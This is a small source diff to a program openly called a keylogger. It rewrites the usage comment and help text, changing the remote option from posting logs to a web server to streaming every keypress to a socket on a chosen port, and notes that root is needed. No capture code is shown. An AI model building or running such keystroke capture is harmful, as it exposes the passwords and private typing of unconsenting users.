@@ -10,12 +10,12 @@
 /*
 usage:  keylogger --help
 displays this help menu
-keylogger [-f <output file>] [-n <http port>][-v]
+keylogger [-f <output file>] [-n <port>][-v]
 -f : for copything the output to a file
 -n : for starting an http server to view the log
 -v : enable verbose mode
 Program will log all user keypresses. Caution, program most likely needs to be run as root.
-The program can be configured to log to print to stdout, log to a file, and post log to webserver.
+The program can be configured to log to print to stdout, log to a file, and stream to socket.
  */
 
 
@@ -104,11 +104,11 @@ void KLG_printHelp(){
     const char *msg = "\
 usage:  keylogger --help\n\
 \tdisplays this help menu\n\
-keylogger [-f <output file>] [-n <http port>][-v]\n\
+keylogger [-f <output file>] [-n <port>][-v]\n\
 Program will log all user keypresses. Caution, program most likely needs to be run as root.\n\
-The program can be configured to log to print to stdout, log to a file, and post log to webserver.\n\
+The program can be configured to print to stdout, log to a file, and stream keypresses to socket.\n\
 \t-f : for copything the output to a file\n\
-\t-n : for starting an http server to view the log\n\
+\t-n : for starting a socket at port <port>\n\
 \t-v : enable verbose mode\n";
     printf( "%s",msg );
 }
